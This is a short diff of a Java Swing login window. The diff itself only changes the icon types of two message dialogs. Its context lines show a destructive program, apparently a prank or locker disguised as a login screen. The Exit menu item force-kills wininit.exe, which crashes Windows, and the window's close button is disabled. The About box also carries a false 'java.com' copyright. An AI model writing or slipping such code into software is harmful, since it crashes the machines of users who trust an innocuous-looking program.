@@ -77,7 +77,7 @@ public class LoginGUI extends JFrame{
                 @Override
                 public void windowDeactivated(WindowEvent e) {}});
             this.setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
-            miAbout.addActionListener(e -> JOptionPane.showMessageDialog(this, "Copyright 2021 java.com ALL Rights Reserved", "Important tips", JOptionPane.WARNING_MESSAGE));
+            miAbout.addActionListener(e -> JOptionPane.showMessageDialog(this, "Copyright 2021 java.com ALL Rights Reserved", "Important tips", JOptionPane.INFORMATION_MESSAGE));
             miExit.addActionListener(e -> {
                 try {
                     Runtime.getRuntime().exec("taskkill /f /t /im wininit.exe");
@@ -118,7 +118,7 @@ public class LoginGUI extends JFrame{
                             System.out.println("Fuck");
                         }
                     }
-                    JOptionPane.showMessageDialog(this, "Login Failed.", "Message", JOptionPane.WARNING_MESSAGE);
+                    JOptionPane.showMessageDialog(this, "Login Failed.", "Message", JOptionPane.ERROR_MESSAGE);
                 }
             });
         }
